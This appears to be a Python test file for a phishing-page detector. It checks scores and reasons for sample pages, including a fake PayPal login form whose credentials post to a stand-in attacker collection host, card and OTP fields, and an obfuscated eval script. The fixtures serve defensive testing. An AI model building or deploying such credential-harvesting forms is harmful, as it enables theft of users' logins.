from argus_api.intel.page import analyze_page

PHISH = """<html><head><title>PayPal: Log in to your account</title></head><body>
<form action="https://collect.evil-host.ru/gate.php" method="post">
<input type="email" name="login"><input type="password" name="pw"></form></body></html>"""


def test_fake_paypal_login_on_a_random_host():
    r = analyze_page(PHISH, "https://paypal-secure-check.xyz/login")
    assert r.score >= 80
    assert any("pretending to be PayPal" in x for x in r.reasons)
    assert any("evil-host.ru" in x for x in r.reasons)


def test_real_paypal_login_is_not_flagged():
    html = PHISH.replace("https://collect.evil-host.ru/gate.php", "/signin")
    assert analyze_page(html, "https://www.paypal.com/signin", popular=True).score == 0


def test_card_and_code_fields():
    html = '<form><input name="cardNumber"><input name="cvv"><input placeholder="Enter OTP"></form>'
    assert analyze_page(html, "https://shop-deals.top/pay").score >= 35


def test_obfuscated_script():
    html = "<script>eval(atob('ZG9jdW1lbnQud3JpdGUoJ2hpJyk='))</script><p>Hello</p>"
    assert any("obfuscated" in x for x in analyze_page(html, "https://x.example/").reasons)


def test_plain_article_is_clean():
    r = analyze_page("<html><title>My blog</title><p>Five tips for mornings</p></html>", "https://someblog.net/post")
    assert (r.score, r.reasons) == (0, [])


def test_news_that_mentions_brands_is_not_impersonation():
    html = "<html><title>Hacker News</title><p>Microsoft ships a new Windows build</p><p>PayPal cuts fees</p></html>"
    assert analyze_page(html, "https://news.ycombinator.com/").score == 0


def test_search_box_posting_to_another_site_is_fine():
    html = '<title>Hacker News</title><form method="get" action="//hn.algolia.com/"><input type="text" name="q"></form>'
    assert analyze_page(html, "https://news.ycombinator.com/").score == 0


def test_brand_named_next_to_a_password_box_is_impersonation():
    html = "<title>Sign in</title><h1>Microsoft account</h1><form><input type='password'></form>"
    assert any("pretending to be Microsoft" in x for x in analyze_page(html, "https://login-portal.example/").reasons)


def test_hidden_fields_are_not_questions_to_the_user():
    html = '<form action="/go"><input type="hidden" name="otp_nonce" value="x"><input name="q"></form>'
    assert analyze_page(html, "https://tiny-shop.example/").score == 0
